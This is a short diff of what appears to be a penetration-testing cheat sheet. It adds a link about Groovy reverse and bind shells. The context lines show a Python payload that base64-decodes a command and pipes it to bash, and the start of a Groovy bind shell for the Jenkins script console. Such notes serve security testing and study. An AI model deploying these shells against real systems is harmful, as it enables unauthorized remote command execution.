@@ -239,6 +239,7 @@ https://pentestmonkey.net/
     > __import__("os").system("echo <output of base64 encoding> | base64 -d | bash")
 
 > groovy bind-shell for jenkins script-console:
+https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
   int port=5555;
   String cmd="/bin/bash";
   Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
